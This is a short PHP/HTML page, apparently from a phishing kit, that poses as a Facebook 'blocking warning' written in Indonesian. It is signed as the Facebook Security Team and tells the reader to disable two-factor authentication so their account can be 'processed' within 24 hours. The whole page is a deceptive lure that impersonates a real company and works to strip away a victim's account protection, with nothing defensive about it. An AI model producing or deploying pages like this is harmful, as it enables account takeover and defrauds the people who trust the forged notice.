<?php
$random = rand(1000,5000);
?>
<title> Facebook 
</br>
</br>
</title>
<center> <h2> 
</br>
Peringatan Pemblokiran!!
</br>
________________________________________
</br>
</br>
Akun Facebook Anda Sedang Kami Proses, Anda Akan Menerima Notifikasi Selanjutnya Dalam Waktu 1x24 Jam.
</br>
________________________________________



</br>





</br>


</br>

_________________________________________
</br>
</br>
Jika Anda Menggunakan Autentikasi Dua Faktor
</br>
Harap Segera Menonaktifkan Autentikasi Dua Faktor Tersebut
</br>
</br>
Karena Itu Dapat Menghambat Dalam Memproses Akun Anda.
</br>
__________________________________________
</br>
Terima Kasih,
</br>
Tim Keamanan Facebook.

</br>
___________________________________________